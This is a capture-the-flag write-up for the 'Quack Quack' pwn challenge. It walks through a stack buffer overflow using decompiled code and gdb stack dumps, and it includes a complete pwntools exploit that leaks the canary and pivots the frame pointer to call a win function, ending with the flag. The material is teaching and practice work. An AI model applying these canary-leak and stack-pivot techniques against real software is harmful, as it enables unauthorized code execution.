# Cyber Apocalypse CTF 2025: Tales from Eldoria


## Quack Quack
> On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!
 
- **Category**: Pwn 
- **Difficulty**: Very Easy
- **Author**: Cioppo


## Writeup


Our most important function is ``duckling``, it is called instantly. We can see that both buffers can be overflowed
```C
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF
  _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 102uLL); // Here!
  v1 = strstr((const char *)buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 106uLL); // And here!
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

We notice from the ``checksec`` that the binary has a canary but no PIE
```bash
> checksec quack_quack
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   N
```
We notice too that the binary contains a win function called ``duck_attack``.
Our objective is to somehow run that function.

We can try to overflow the ``0x00`` bytes of the canary with our first input, leak it with the ``printf`` and then override the return address but it's not that easy!
The first overflow 
```C
read(0, buf, 102uLL); // Here!
```
Is not enough to get to the canary and the second only reaches the frame pointer
```C
read(0, v3, 106uLL); // And here!
```

but have a ``strstr`` which checks if the string ``Quack Quack `` is in our first input. Looking at the man page:
```
DESCRIPTION
       The  strstr()  function  finds  the  first occurrence of the substring needle in the
       string haystack.  The terminating null bytes ('\0') are not compared.

       The strcasestr() function is like strstr(), but ignores the case of both arguments.

RETURN VALUE
       These functions return a pointer to the beginning of the located substring, or  NULL
       if the substring is not found.

       If needle is the empty string, the return value is always haystack itself.
```
we see that this will return a pointer to the beginning of the found substring. We can use this to our advantage because the next ```printf``` will print a string ``%s`` from where the ``strstr`` found the substring ``+ 32``
```C
read(0, buf, 102uLL);
v1 = strstr((const char *)buf, "Quack Quack ");
if ( !v1 )
{
error("Where are your Quack Manners?!\n");
exit(1312);
}
printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```
we can then send this payload
```py
payload = (b"Quack Quack \x00").rjust(100+2, b"A")
```
here we are trying to put the ``Quack Quack `` string exactly ``32+2`` bytes before the canary. This will print us the canary minus the ``0x00`` byte.
We can find the offset from gdb
```bash
pwndbg> stack 20
00:0000│ rsp 0x7fffffffda30 ◂— 0x0
01:0008│-088 0x7fffffffda38 ◂— 0x0
02:0010│ rsi 0x7fffffffda40 ◂— 'Start of the buffer!\n'
03:0018│-078 0x7fffffffda48 ◂— ' the buffer!\n'
04:0020│-070 0x7fffffffda50 ◂— 0xa21726566 /* 'fer!\n' */
05:0028│-068 0x7fffffffda58 ◂— 0x0
... ↓        10 skipped
10:0080│-010 0x7fffffffdab0 —▸ 0x7ffff7e17600 (__GI__IO_file_jumps) ◂— 0x0
11:0088│-008 0x7fffffffdab8 ◂— 0xd53297dc10d99200 # Canary
12:0090│ rbp 0x7fffffffdac0 —▸ 0x7fffffffdae0 ◂— 0x1
13:0098│+008 0x7fffffffdac8 —▸ 0x40162a (main+37) ◂— mov eax, 0
```
then: 
```py
>>> 0x7fffffffdab8 - (32 - len("Quack Quack ")) - 0x7fffffffda40
100
```

Sending this payload will leak us the canary and the frame pointer (we will need this later)
```py
[DEBUG] Sent 0x66 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000050  41 41 41 41  41 41 41 41  41 51 75 61  63 6b 20 51  │AAAA│AAAA│AQua│ck Q│
    00000060  75 61 63 6b  20 00                                  │uack│ ·│
    00000066
[DEBUG] Received 0x37 bytes:
    00000000  51 75 61 63  6b 20 51 75  61 63 6b 20  e8 07 5c ac  │Quac│k Qu│ack │··\·│
    00000010  74 c4 e1 e0  fd ed 2b fe  7f 2c 20 72  65 61 64 79  │t···│··+·│·, r│eady│
    00000020  20 74 6f 20  66 69 67 68  74 20 74 68  65 20 44 75  │ to │figh│t th│e Du│
    00000030  63 6b 3f 0a  0a 3e 20                               │ck?·│·> │
    00000037
```
we can parse this easly like this
```py
r.recvuntil(b"Quack Quack ")
canary = u64(b"\x00" + r.recv(7))
stack_addr = u64(r.recv(6) + b"\x00\x00") 
```

We have the canary, now how can we execute our win function with only control of the frame pointer? We just move that frame pointer to our controlled buffer and ``main`` will call ``duck_attack`` for us!

First let's find how much we need to change that leaked stack address, again we can use gdb.
```py
pwndbg> stack 24
00:0000│ rsp 0x7fffffffda30 ◂— 0x0
01:0008│-088 0x7fffffffda38 —▸ 0x7fffffffda40 ◂— 'Quack Quack \n'
02:0010│-080 0x7fffffffda40 ◂— 'Quack Quack \n'
03:0018│-078 0x7fffffffda48 ◂— 0xa206b6361 /* 'ack \n' */
04:0020│-070 0x7fffffffda50 ◂— 0x0
05:0028│-068 0x7fffffffda58 ◂— 0x0
06:0030│ rsi 0x7fffffffda60 ◂— 'Second buffer start\n'
07:0038│-058 0x7fffffffda68 ◂— 'uffer start\n'
08:0040│-050 0x7fffffffda70 ◂— 0xa747261 /* 'art\n' */
09:0048│-048 0x7fffffffda78 ◂— 0x0
... ↓        6 skipped
10:0080│-010 0x7fffffffdab0 —▸ 0x7ffff7e17600 (__GI__IO_file_jumps) ◂— 0x0
11:0088│-008 0x7fffffffdab8 ◂— 0xf16e36642f62f200
12:0090│ rbp 0x7fffffffdac0 —▸ 0x7fffffffdae0 ◂— 0x1
13:0098│+008 0x7fffffffdac8 —▸ 0x40162a (main+37) ◂— mov eax, 0
14:00a0│+010 0x7fffffffdad0 ◂— 0x89a0e288a0e280a0
15:00a8│+018 0x7fffffffdad8 ◂— 0xf16e36642f62f200
16:00b0│+020 0x7fffffffdae0 ◂— 0x1
17:00b8│+028 0x7fffffffdae8 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax
```
so:
```py
>>> 0x7fffffffdae0 - 0x7fffffffda60
128
```
we just need to remove this offset from the leaked stack address to move the stack to our buffer

Let's put this all together
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./quack_quack")
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"

global r
def conn():
    global r
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("addr", 1337)

    return r

BUF_OFF = 100
OFFSET_BSTACK = 96
STACK_DIFF = 128
WIN = exe.symbols["duck_attack"]

def main():
    conn()

    # We try to leak the canary and stack address by not printing the 0x00 byte (+2)
    payload = (b"Quack Quack \x00").rjust(BUF_OFF+2, b"A")
    r.sendafter(b"> ", payload)

    r.recvuntil(b"Quack Quack ")
    canary = u64(b"\x00" + r.recv(7))
    r.success(f"Leaked canary: {hex(canary)}")
    stack_addr = u64(r.recv(6) + b"\x00\x00") - STACK_DIFF + 8 # We need the canary to be at rbp-8
    r.success(f"Stack addr of second buf: {hex(stack_addr)}")

    #Fake stack to call the win function from main
    upper = flat([ 
        canary,
        0xdeadbeaf,
        WIN
    ]).ljust(OFFSET_BSTACK-8, b"A") #Found this offset the same way as before

    # Move stack to our fake replica
    payload = upper + flat([canary, stack_addr])
    r.sendafter(f"> ", payload)

    r.interactive()

if __name__ == "__main__":
    main()
```

>HTB{\~c4n4ry_g035_qu4ck_qu4ck\~_bb5be49bc421f11646e85b598441c163}